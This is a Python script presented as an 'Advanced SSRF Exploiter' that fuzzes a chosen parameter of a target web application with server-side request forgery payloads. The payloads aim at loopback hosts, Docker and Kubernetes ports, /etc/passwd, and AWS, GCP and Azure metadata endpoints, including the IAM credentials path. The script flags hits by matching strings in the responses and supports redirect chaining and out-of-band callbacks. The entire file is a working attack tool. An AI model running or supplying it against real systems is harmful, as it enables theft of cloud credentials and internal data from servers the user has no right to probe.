#!/usr/bin/env python3
import argparse
import csv
import json
import random
import string
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote

import requests
from tqdm import tqdm

# common user agent strings for random requests
DEFAULT_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "curl/7.87.0",
    "Wget/1.21.3",
    "python-requests/2.31"
]

# list of internal/local ip addresses and hostnames
DEFAULT_TARGET_HOSTS = [
    # Loopback / local
    "http://127.0.0.1",
    "http://localhost",
    "http://[::1]",
    # Link-local metadata
    "http://169.254.169.254",       
    "http://metadata.google.internal",     
    "http://169.254.169.254/metadata/instance", 
    "http://kubernetes.default.svc",       
    # File scheme (if parser allows)
    "file:///etc/passwd",
]

# list of common paths to append to target hosts
DEFAULT_PATHS = [
    "/", "",
    "/latest/meta-data/",                           # aws list
    "/latest/meta-data/iam/security-credentials/",  # aws iam role names
    "/latest/user-data",                            # aws user data
    "/computeMetadata/v1/",                         # gcp requires header but try anyway
    "/metadata/instance?api-version=2021-02-01",    # azure imds
    "/api", "/admin", "/debug", "/health", "/metrics",
    "/version", "/_internal", "/actuator/env"
]

# list of common ports to test on internal hosts
DEFAULT_PORTS = [80, 443, 8080, 8000, 2375, 2376, 5000]  # web, docker, registries

# list of strings to look for in responses for successful ssrf
DEFAULT_EVIDENCE = [
    "root:x:", "ec2-user", "AMI-ID", "instance-id", "X-aws-ec2-metadata-token",
    "Google", "Metadata-Flavor", "Azure", "Microsoft", "inet addr:",
    "<title>Dashboard</title>", "127.0.0.1", "kube", "apiVersion"
]

# list of basic payloads
DEFAULT_SEED_PAYLOADS = [
    "http://localhost",
    "http://127.0.0.1",
    "http://169.254.169.254/latest/meta-data/",
    "http://[::1]/",
    "http://internal-service/",
]

# function that generates payloads by appending different seeds, paths, and ports with each other
def build_payloads(seed, hosts, ports, paths, combine):
    payloads = set(seed)
    if not combine:
        payloads.update(hosts)
        return list(payloads)

    for h in hosts:
        # file:// payloads don't take ports
        if h.startswith("file://"):
            payloads.add(h)
            continue
        # host with optional ports
        parsed = urlparse(h)
        base_no_trailing = f"{parsed.scheme}://{parsed.netloc}".rstrip("/")
        # add plain host and with each port + each path
        payloads.add(base_no_trailing + "/")
        for p in ports:
            host_with_port = f"{parsed.scheme}://{parsed.hostname}:{p}"
            # if netloc already had port, still try explicit
            for path in paths:
                if path and not path.startswith("/"):
                    path = "/" + path
                payloads.add(host_with_port + (path or "/"))
    return sorted(payloads)

# function that constructs the final url for scanning by injecting payloads into the query strings of the base url, oob integration
def inject_url(base_url, param, payload, redirect_chain=None, oob_suffix=None):
    if oob_suffix and payload.startswith(("http://", "https://")):
        sep = "&" if "?" in payload else "?"
        payload = f"{payload}{sep}x={oob_suffix}"

    final_payload = payload
    if redirect_chain:
        final_payload = redirect_chain.replace("{TARGET}", quote(payload, safe=""))

    parsed = urlparse(base_url)
    qs = parse_qs(parsed.query)
    qs[param] = final_payload
    new_qs = urlencode(qs, doseq=True)
    return urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', new_qs, ''))

# function that generates a random length string for oob
def random_token(n=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

# function that performs single ssrf test by scanning and sending get request, and parsing through the response for info
def fetch_with_payload(session, base_url, param, payload, allow_redirects, headers):
    url = inject_url(base_url, param, payload, headers.get("_redirect_chain"), headers.get("_oob"))
    req_headers = {k: v for k, v in headers.items() if not k.startswith("_")}
    t0 = time.time()
    try:
        resp = session.get(url, timeout=12, allow_redirects=allow_redirects, headers=req_headers)
        dt = time.time() - t0
        info = {
            "payload": payload,
            "target_url": url,
            "status": resp.status_code,
            "length": len(resp.text or ""),
            "elapsed": round(dt, 3),
            "location": resp.headers.get("Location", ""),
            "evidence": []
        }
        return resp, info
    except Exception as e:
        return None, {
            "payload": payload,
            "target_url": url,
            "status": -1,
            "length": 0,
            "elapsed": round(time.time() - t0, 3),
            "location": "",
            "error": str(e),
            "evidence": []
        }

# function that uses threads to concurrently automate previously made functions to attain info and put it into an empty findings dictionary
def fuzz_ssrf(base_url, vuln_param, payloads, headers, threads=30, allow_redirects=False,
              evidence_markers=None):
    findings = []
    markers = set(evidence_markers or [])
    baseline_len = None
    baseline_status = None

    with requests.Session() as s:
        futures = []
        with ThreadPoolExecutor(max_workers=threads) as pool:
            for pl in payloads:
                futures.append(pool.submit(fetch_with_payload, s, base_url, vuln_param, pl, allow_redirects, headers))

            for fut in tqdm(as_completed(futures), total=len(futures), desc="Payloads"):
                resp, info = fut.result()

                if baseline_len is None and info.get("status", -1) > 0:
                    baseline_len = info["length"]
                    baseline_status = info["status"]

                if resp is not None and resp.text:
                    text = resp.text
                    for m in markers:
                        if m and m in text:
                            info["evidence"].append(m)

                changed = False
                if baseline_len is not None and (info["length"] != baseline_len or info["status"] != baseline_status):
                    changed = True

                # heuristics for potential ssrf
                if info["evidence"] or info["status"] in (500, 502, 503, 504) or changed:
                    findings.append(info)

    return findings

# functions that save findings into either json or csv output formats
def save_json(findings, path):
    with open(path, "w", encoding="utf-8") as f:
        json.dump(findings, f, indent=2)
    print(f"|+| JSON saved → {path}")

def save_csv(findings, path):
    if not findings:
        print("|*| No findings to save.")
        return
    cols = ["payload", "target_url", "status", "length", "elapsed", "location", "evidence", "error"]
    with open(path, "w", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=cols)
        w.writeheader()
        for row in findings:
            row = {**{k: row.get(k, "") for k in cols}}
            if isinstance(row.get("evidence"), list):
                row["evidence"] = ";".join(row["evidence"])
            w.writerow(row)
    print(f"|+| CSV saved → {path}")

# arg parser for cli customizability
def cli():
    p = argparse.ArgumentParser(description="Advanced SSRF Exploiter (multi-threaded)")
    p.add_argument("url", help="Target URL with vulnerable parameter")
    p.add_argument("param", help="Vulnerable parameter name")
    p.add_argument("-w", "--wordlist", help="Payload wordlist (one per line)")
    p.add_argument("--combine", action="store_true",
                   help="Generate combinations of internal hosts × ports × paths")
    p.add_argument("--threads", type=int, default=30, help="Concurrency (default 30)")
    p.add_argument("--follow", action="store_true", help="Follow redirects (default no)")
    p.add_argument("--header", action="append", default=[], help="Extra header: Key:Value")
    p.add_argument("--cookie", help="Cookie header value")
    p.add_argument("--proxy", help="HTTP proxy (e.g., http://127.0.0.1:8080)")
    p.add_argument("--marker", action="append", default=[], help="Add more evidence markers")
    p.add_argument("--redirector", help="Open-redirect chain template, use {TARGET} placeholder")
    p.add_argument("--oob-domain", help="Append unique tokens for OOB correlation (e.g., x.<yourdomain>)")
    p.add_argument("--json-out", help="Save findings to JSON")
    p.add_argument("--csv-out", help="Save findings to CSV")
    args = p.parse_args()

    # headers
    headers = {}
    specified_ua = False
    for hv in args.header:
        if ":" in hv:
            k, v = hv.split(":", 1)
            headers[k.strip()] = v.strip()
            if k.lower().strip() == "user-agent":
                specified_ua = True
    if not specified_ua:
        headers["User-Agent"] = random.choice(DEFAULT_USER_AGENTS)
    if args.cookie:
        headers["Cookie"] = args.cookie

    # internal helper headers to carry chain and oob token
    if args.redirector:
        headers["_redirect_chain"] = args.redirector
    if args.oob_domain:
        headers["_oob"] = f"{random_token(6)}.{args.oob_domain}"

    if args.proxy:
        requests_proxies = {"http": args.proxy, "https": args.proxy}
    else:
        requests_proxies = None

    # Build payloads
    if args.wordlist:
        with open(args.wordlist, "r", encoding="utf-8", errors="ignore") as f:
            seed_payloads = [line.strip() for line in f if line.strip()]
    else:
        seed_payloads = DEFAULT_SEED_PAYLOADS

    payloads = build_payloads(
        seed=seed_payloads,
        hosts=DEFAULT_TARGET_HOSTS,
        ports=DEFAULT_PORTS,
        paths=DEFAULT_PATHS,
        combine=args.combine
    )

    # evidence markers
    evidence = DEFAULT_EVIDENCE + args.marker

    # configure requests defaults
    requests_kwargs = {}
    if requests_proxies:
        requests_kwargs["proxies"] = requests_proxies

    print(f"|*| Fuzzing '{args.param}' for SSRF with {len(payloads):,} payload(s)...")
    if requests_proxies:
        old_session = requests.Session

        def proxied_session():
            s = old_session()
            s.proxies.update(requests_proxies)
            return s

        requests.Session = proxied_session  # monkey‑patch for this run

    findings = fuzz_ssrf(
        base_url=args.url,
        vuln_param=args.param,
        payloads=payloads,
        headers=headers,
        threads=args.threads,
        allow_redirects=args.follow,
        evidence_markers=evidence
    )

    print("\n=== Summary ===")
    if not findings:
        print("|-| No strong SSRF signals found.")
    else:
        print(f"|+| Potential findings: {len(findings)}")
        for r in findings[:10]:
            ev = f" | evidence={','.join(r['evidence'])}" if r.get("evidence") else ""
            print(f"    - {r['payload']} -> {r['status']} len={r['length']} t={r['elapsed']}s{ev}")

    if args.json_out:
        save_json(findings, args.json_out)
    if args.csv_out:
        save_csv(findings, args.csv_out)

if __name__ == "__main__":
    cli()
